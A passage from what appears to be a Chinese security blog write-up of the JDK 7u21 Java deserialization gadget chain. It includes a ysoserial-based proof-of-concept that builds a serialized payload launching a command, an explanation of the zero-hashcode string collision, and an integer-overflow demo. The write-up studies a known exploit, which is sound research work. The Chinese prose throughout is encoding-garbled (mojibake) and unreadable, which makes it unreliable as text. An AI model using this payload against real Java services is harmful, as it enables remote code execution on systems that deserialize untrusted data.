</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">...</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="n">Proxy</span><span class="p">(</span><span class="n">Templates</span><span class="p">).</span><span class="na">hashCode</span><span class="p">()</span><span class="w"> </span><span class="p">(</span><span class="n">X</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">AnnotationInvocationHandler</span><span class="p">.</span><span class="na">invoke</span><span class="p">()</span><span class="w"> </span><span class="p">(</span><span class="n">X</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">          </span><span class="n">AnnotationInvocationHandler</span><span class="p">.</span><span class="na">hashCodeImpl</span><span class="p">()</span><span class="w"> </span><span class="p">(</span><span class="n">X</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">String</span><span class="p">.</span><span class="na">hashCode</span><span class="p">()</span><span class="w"> </span><span class="p">(</span><span class="n">0</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">AnnotationInvocationHandler</span><span class="p">.</span><span class="na">memberValueHashCode</span><span class="p">()</span><span class="w"> </span><span class="p">(</span><span class="n">X</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">              </span><span class="n">TemplatesImpl</span><span class="p">.</span><span class="na">hashCode</span><span class="p">()</span><span class="w"> </span><span class="p">(</span><span class="n">X</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="n">Proxy</span><span class="p">(</span><span class="n">Templates</span><span class="p">).</span><span class="na">equals</span><span class="p">()</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">AnnotationInvocationHandler</span><span class="p">.</span><span class="na">invoke</span><span class="p">()</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">          </span><span class="n">AnnotationInvocationHandler</span><span class="p">.</span><span class="na">equalsImpl</span><span class="p">()</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Method</span><span class="p">.</span><span class="na">invoke</span><span class="p">()</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">              </span><span class="p">...</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">TemplatesImpl</span><span class="p">.</span><span class="na">getOutputProperties</span><span class="p">()</span><span class="w">
</span></span></span></code></pre></div><p>è¿™é‡Œå…¶å®åˆ°<code>Proxy(Templates).equals()</code>å‰éƒ½æ˜¯ä¸ºäº†è¿›å…¥<code>equalsè¿™æ­¥if</code>ï¼Œå‰é¢éƒ½æ˜¯ä¸ºäº†hashç›¸ç­‰çš„æ„é€ ï¼ˆä¹Ÿå°±æ˜¯æ ¸å¿ƒsinkåˆ©ç”¨æ­¥éª¤åªæœ‰åé¢è¿™æ®µï¼‰</p>
<h3 id="poc">poc<a hidden class="anchor" aria-hidden="true" href="#poc">#</a></h3>
<p>pocæ˜¯ç›´æ¥ç”¨çš„ysoserialçš„</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">ysoserial.Deserializer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">ysoserial.Serializer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">ysoserial.payloads.Jdk7u21</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">ysoserial.payloads.util.Gadgets</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">ysoserial.payloads.util.Reflections</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.xml.transform.Templates</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.InvocationHandler</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.HashMap</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.LinkedHashSet</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">jdk7u21_poc</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Object</span><span class="w"> </span><span class="n">templates</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Gadgets</span><span class="p">.</span><span class="na">createTemplatesImpl</span><span class="p">(</span><span class="s">&#34;calc&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">zeroHashCodeStr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;f5a5a608&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">HashMap</span><span class="w"> </span><span class="n">map</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">HashMap</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">map</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">zeroHashCodeStr</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;foo&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">InvocationHandler</span><span class="w"> </span><span class="n">tempHandler</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">InvocationHandler</span><span class="p">)</span><span class="w"> </span><span class="n">Reflections</span><span class="p">.</span><span class="na">getFirstCtor</span><span class="p">(</span><span class="s">&#34;sun.reflect.annotation.AnnotationInvocationHandler&#34;</span><span class="p">).</span><span class="na">newInstance</span><span class="p">(</span><span class="n">Override</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="n">map</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Reflections</span><span class="p">.</span><span class="na">setFieldValue</span><span class="p">(</span><span class="n">tempHandler</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;type&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">Templates</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Templates</span><span class="w"> </span><span class="n">proxy</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Templates</span><span class="p">)</span><span class="n">Gadgets</span><span class="p">.</span><span class="na">createProxy</span><span class="p">(</span><span class="n">tempHandler</span><span class="p">,</span><span class="w"> </span><span class="n">Templates</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[</span><span class="n">0</span><span class="o">]</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">LinkedHashSet</span><span class="w"> </span><span class="n">set</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">LinkedHashSet</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">set</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="n">templates</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">set</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="n">proxy</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Reflections</span><span class="p">.</span><span class="na">setFieldValue</span><span class="p">(</span><span class="n">templates</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;_auxClasses&#34;</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="n">Object</span><span class="p">)</span><span class="kc">null</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Reflections</span><span class="p">.</span><span class="na">setFieldValue</span><span class="p">(</span><span class="n">templates</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;_class&#34;</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="n">Object</span><span class="p">)</span><span class="kc">null</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">map</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">zeroHashCodeStr</span><span class="p">,</span><span class="w"> </span><span class="n">templates</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">ser</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Serializer</span><span class="p">.</span><span class="na">serialize</span><span class="p">(</span><span class="n">set</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Deserializer</span><span class="p">.</span><span class="na">deserialize</span><span class="p">(</span><span class="n">ser</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><h3 id="hash">hash<a hidden class="anchor" aria-hidden="true" href="#hash">#</a></h3>
<p>é“¾å­æ•´ä½“æ²¡å•¥è®²çš„ï¼Œå¾ˆç®€å•ã€‚ä¸»è¦æ˜¯<code>hash</code>é‚£</p>
<p>ä¸»è¦è¦æ»¡è¶³ä¸¤æ¬¡è¿›å…¥putæ—¶ï¼Œhashè¦ä¸€æ ·ï¼Œä¸”ç¬¬ä¸€æ¬¡è®¾ç½®çš„<code>key</code>(å°±æ˜¯ç¬¬äºŒæ¬¡çš„k)å¾—æ˜¯<code>TemplatesImpl</code>ï¼ˆå› ä¸ºè¿™ä¸ªæ˜¯ä½œä¸ºæœ€åinvokeçš„objectè¿›è¡Œè°ƒç”¨çš„ï¼‰ä¹Ÿå°±æ˜¯è¯´<code>proxy</code>putè°ƒç”¨å‰ï¼Œå¾—æœ‰ä¸€ä¸ªå­˜å‚¨å€¼keyå¾—æ˜¯<code>TemplatesImpl</code>ä¸”hashè¦å’Œ<code>proxy</code>è®¡ç®—å‡ºçš„hashç›¸åŒ</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">HashSet</span><span class="o">&lt;</span><span class="n">E</span><span class="o">&gt;</span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">readObject</span><span class="p">(</span><span class="n">java</span><span class="p">.</span><span class="na">io</span><span class="p">.</span><span class="na">ObjectInputStream</span><span class="w"> </span><span class="n">s</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">throws</span><span class="w"> </span><span class="n">java</span><span class="p">.</span><span class="na">io</span><span class="p">.</span><span class="na">IOException</span><span class="p">,</span><span class="w"> </span><span class="n">ClassNotFoundException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="o">=</span><span class="n">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">&lt;</span><span class="n">size</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="n">E</span><span class="w"> </span><span class="n">e</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">E</span><span class="p">)</span><span class="w"> </span><span class="n">s</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="n">map</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">e</span><span class="p">,</span><span class="w"> </span><span class="n">PRESENT</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p><img loading="lazy" src="images/image-20250507182751938.png" alt="image-20250507182751938"  />
</p>
<p>ç„¶åè¿™é‡Œ<code>TemplatesImpl</code>çš„<code>hashcode()</code>è°ƒç”¨æ˜¯ç›´æ¥è°ƒç”¨<code>Objectçš„hashcode()</code></p>
<p>è€Œ<code>proxy</code>çš„<code>hashcode()</code>è¿™é‡Œåˆ™æ˜¯æœ‰å¯¹åº”çš„å¤„ç†æ–¹å¼ï¼ˆè¿™é‡Œå…¶å®å¯ä»¥æ§åˆ¶è¿”å›0ï¼Œä½†æ˜¯<code>TemplatesImpl</code>çš„<code>hashcode()</code>ä¸å¯èƒ½ä¸º0ï¼Œæ‰€ä»¥ä¸èƒ½è¿™æ ·æ„é€ </p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">private</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">hashCodeImpl</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">int</span><span class="w"> </span><span class="n">var1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">0</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Map</span><span class="p">.</span><span class="na">Entry</span><span class="w"> </span><span class="n">var3</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">for</span><span class="p">(</span><span class="n">Iterator</span><span class="w"> </span><span class="n">var2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="na">memberValues</span><span class="p">.</span><span class="na">entrySet</span><span class="p">().</span><span class="na">iterator</span><span class="p">();</span><span class="w"> </span><span class="n">var2</span><span class="p">.</span><span class="na">hasNext</span><span class="p">();</span><span class="w"> </span><span class="n">var1</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">127</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="p">((</span><span class="n">String</span><span class="p">)</span><span class="n">var3</span><span class="p">.</span><span class="na">getKey</span><span class="p">()).</span><span class="na">hashCode</span><span class="p">()</span><span class="w"> </span><span class="o">^</span><span class="w"> </span><span class="n">memberValueHashCode</span><span class="p">(</span><span class="n">var3</span><span class="p">.</span><span class="na">getValue</span><span class="p">()))</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">var3</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Map</span><span class="p">.</span><span class="na">Entry</span><span class="p">)</span><span class="n">var2</span><span class="p">.</span><span class="na">next</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">var1</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p><code>this.memberValues</code>å¯ä»¥åˆå§‹åŒ–è®¾ç½®ï¼Œå¯ä»¥çœ‹åˆ°è¿”å›çš„æ˜¯<code>var1</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">var1</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">127</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="p">((</span><span class="n">String</span><span class="p">)</span><span class="n">var3</span><span class="p">.</span><span class="na">getKey</span><span class="p">()).</span><span class="na">hashCode</span><span class="p">()</span><span class="w"> </span><span class="o">^</span><span class="w"> </span><span class="n">memberValueHashCode</span><span class="p">(</span><span class="n">var3</span><span class="p">.</span><span class="na">getValue</span><span class="p">()))</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    
</span></span></span><span class="line"><span class="cl"><span class="w">    
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">private</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">memberValueHashCode</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">var0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Class</span><span class="w"> </span><span class="n">var1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">var0</span><span class="p">.</span><span class="na">getClass</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">var1</span><span class="p">.</span><span class="na">isArray</span><span class="p">())</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="n">var0</span><span class="p">.</span><span class="na">hashCode</span><span class="p">();</span><span class="w">
</span></span></span></code></pre></div><p>ç„¶å7u21çš„ä½œè€…æ˜¯çˆ†ç ´äº†ä¸€ä¸ª<code>((String)var3.getKey()).hashCode()</code>çš„å€¼ä¸º**<code>0</code>**çš„æ•°(<code>&quot;f5a5a608&quot;</code>)</p>
<p>ç„¶åå†è®©<code>var3.getValue()</code>ä¸ºç¬¬ä¸€æ¬¡å­˜å‚¨çš„<code>TemplatesImpl</code>ä¸ºåŒä¸€ä¸ªå¯¹è±¡ï¼Œå³å¯å®ç°å’Œç¬¬ä¸€æ¬¡çš„hashå€¼ç›¸ç­‰</p>
<p>å·§çš„ç‚¹å°±åœ¨è¿™hhhï¼Œæˆ‘ç¬¬ä¸€åä¹‰è‚¯å®šæƒ³ä¸åˆ°<code>ä¸€ä¸ªæœ‰å€¼çš„String.hashcode()çš„å€¼ä¼šä¸º0</code>ï¼ï¼</p>
<h3 id="-string-hashcode--æ•´å½¢æº¢å‡º">[*] String hashcode &amp; æ•´å½¢æº¢å‡º<a hidden class="anchor" aria-hidden="true" href="#-string-hashcode--æ•´å½¢æº¢å‡º">#</a></h3>
<p>ç„¶åå°±å¥½å¥‡å‘€ï¼Œå°±å»çœ‹ä»£ç äº†ï¼Œå‘ç°æ˜¯æº¢å‡ºå¯¼è‡´çš„è´Ÿæ•°ä»è€Œå¯¼è‡´å¯ä»¥å¾—åˆ°<code>0</code>è¿™ä¸ªå€¼hhhï¼ŒæŒºæœ‰æ„æ€çš„ï¼Œç¬¬ä¸€æ¬¡ç›´è§‚æ„Ÿå—åˆ°æ•´å½¢æº¢å‡ºçš„åˆ©ç”¨</p>
<p><img loading="lazy" src="images/image-20250507185246029.png" alt="image-20250507185246029"  />
</p>
<p>ç„¶åå†™äº†ä¸ªå°demoï¼Œæ„Ÿè§‰æŒºæœ‰æ„æ€çš„</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">hashtest</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">Integer</span><span class="p">.</span><span class="na">MAX_VALUE</span><span class="p">);</span><span class="w">  </span><span class="c1">// è¾“å‡º 2147483647</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">Integer</span><span class="p">.</span><span class="na">MIN_VALUE</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">2147483647</span><span class="o">*</span><span class="n">100</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">2147483647</span><span class="o">*</span><span class="n">2</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">2147483647</span><span class="o">+</span><span class="n">1</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="o">-</span><span class="n">2147483648</span><span class="o">-</span><span class="n">1</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="o">-</span><span class="n">2147483648</span><span class="o">*</span><span class="n">3</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">2147483647</span><span class="o">*</span><span class="n">3</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;&#34;</span><span class="p">.</span><span class="na">hashCode</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">è¾“å‡º</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">2147483647</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">-</span><span class="n">2147483648</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">-</span><span class="n">100</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">-</span><span class="n">2</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">-</span><span class="n">2147483648</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">2147483647</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">-</span><span class="n">2147483648</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">2147483645</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">0</span><span class="w">
</span></span></span></code></pre></div><p>ç„¶åå¯¹<code>intçš„å€¼åŸŸ</code>çš„ç†è§£ï¼Œå…¶å®ç±»ä¼¼ä¸€ä¸ª<code>ç¯å½¢</code>ï¼ˆ<code>æœ€å°å€¼</code>è¿æ¥ç€<code>æœ€å¤§å€¼</code>ï¼Œmin-1=maxï¼Œmax+1=minï¼‰</p>
<p>è¿™é‡Œç®€å•è§£é‡Šä¸‹<code>-2147483648*2 = 0</code> ï¼Œ<code>2147483647*2 = -2</code></p>
<p>è¿™é‡Œå…¶å®å°±æ˜¯äºŒè¿›åˆ¶ä¸‹<code>å³ç§»ä¸€æ­¥</code></p>
<p>-2147483648æ˜¯10000000 00000000 00000000 00000000å³ç§»åç›´æ¥00000000 00000000 00000000 00000000ä¹Ÿå°±ä¸º0äº†</p>
<p>2147483647æ˜¯01111111 11111111 11111111 11111111å³ç§»å11111111 11111111 11111111 11111110ï¼Œè¿™é‡Œå¼€å¤´æ˜¯<code>1</code>è¦é‡‡ç”¨<code>è¡¥ç æœºåˆ¶</code>ï¼Œå³ä¸º<code>-</code>å·ï¼Œ<strong>ç„¶åå–åå†+1</strong></p>
<p>å–å00000000 00000000 00000000 00000001+1å¾—00000000 00000000 00000000 00000010ç„¶åç¬¦å·</p>
<p>æ‰€ä»¥ä¸º<code>-2</code>hhï¼Œéƒ½å¿«å¿˜äº†hh å¾ˆæ˜ç™½äº†å§</p>
<h3 id="-å€¼2">[*] å€¼2<a hidden class="anchor" aria-hidden="true" href="#-å€¼2">#</a></h3>
<p>å½“ç„¶è¿™é‡Œå€¼è‚¯å®šä¸æ­¢<code>f5a5a608</code>ä¸€ä¸ªï¼Œä½†æ˜¯å‘¢æˆ‘å¯èƒ½æƒ³ä¸åˆ°<code>æº¢å‡º</code>ä½†æ˜¯æˆ‘è‚¯å®šä¼šæƒ³åˆ°<code>&quot;&quot;</code>ç©ºå€¼</p>
<p>æˆ‘ä»¬çœ‹åˆ°Stringçš„hashé»˜è®¤æ˜¯ä¸º<code>0</code>çš„</p>
<p><img loading="lazy" src="images/image-20250507194950775.png" alt="image-20250507194950775"  />
</p>
<p>å†çœ‹Stringçš„hashCode()ä»£ç ï¼Œæ˜¯ä¸æ˜¯åªæœ‰<code>ä¸è¿›å…¥è¿™ä¸ªif</code>ï¼Œå³å¯å¾—åˆ°<code>hash</code>ä¸º<code>0</code>çš„å­—ç¬¦ä¸²äº†å‘¢</p>
<p><img loading="lazy" src="images/image-20250507195046992.png" alt="image-20250507195046992"  />
</p>
<p>ä¹Ÿå°±æ˜¯è®©length&lt;=0å³å¯ï¼Œå³<code>&quot;&quot;.hashCode()</code>ï¼ŒéªŒè¯å¯è¡Œhh</p>
<p>ç„¶åå…¶å®è¿™é‡Œequalsçš„è§¦å‘ï¼Œ<code>CC7çš„map</code>æˆ‘è§‰å¾—ä¹Ÿå®Œå…¨æ²¡é—®é¢˜ï¼Œæ„Ÿå…´è¶£å¯ä»¥çœ‹çœ‹æˆ‘CC7çš„å‡ ç§ç»•è¿‡hashç›¸ç­‰çš„é—®é¢˜</p>
<p><img loading="lazy" src="images/image-20250507195410886.png" alt="image-20250507195410886"  />
</p>
<h3 id="putç‚¹">putç‚¹<a hidden class="anchor" aria-hidden="true" href="#putç‚¹">#</a></h3>
<p>è¿˜æœ‰ä¸€ä¸ªå…³äºputé¡ºåºçš„pocè®¾è®¡å§ï¼Œä¹Ÿæ˜¯ç±»ä¼¼CCé“¾çš„ã€‚</p>
<p><code>map</code>è¿™ä¸ªå€¼å­˜æ”¾åˆ°<code>AnnotationInvocationHandler.this.memberValues</code>ç”¨äºhashçš„è¿ç®—</p>
<p>ç„¶åè¿™é‡Œmapæ²¡æœ‰ç›´æ¥å­˜<code>TemplatesImplå¯¹è±¡</code>ï¼Œå› ä¸ºä¸‹æ–¹<code>LinkedHashSet#add</code>ä¼šè§¦å‘map#put-&gt;hashçš„æ£€æµ‹â€”â€”&gt;è§¦å‘equalsè°ƒç”¨-&gt;è§¦å‘sinkæŠ¥é”™ä¸­æ–­</p>
<p>æ‰€ä»¥è¿™é‡Œç­‰<code>LinkedHashSet#add</code>å®Œï¼Œå†putè¦†ç›–æˆå¯¹åº”çš„<code>TemplatesImplå¯¹è±¡</code>ï¼Œå…¶ä»–åº”è¯¥æ²¡å•¥è¯´çš„äº†è¿™æ¡é“¾å­</p>
<p><img loading="lazy" src="images/image-20250508091949622.png" alt="image-20250508091949622"  />
</p>
<h3 id="7u21çš„ä¿®å¤">7u21çš„ä¿®å¤<a hidden class="anchor" aria-hidden="true" href="#7u21çš„ä¿®å¤">#</a></h3>
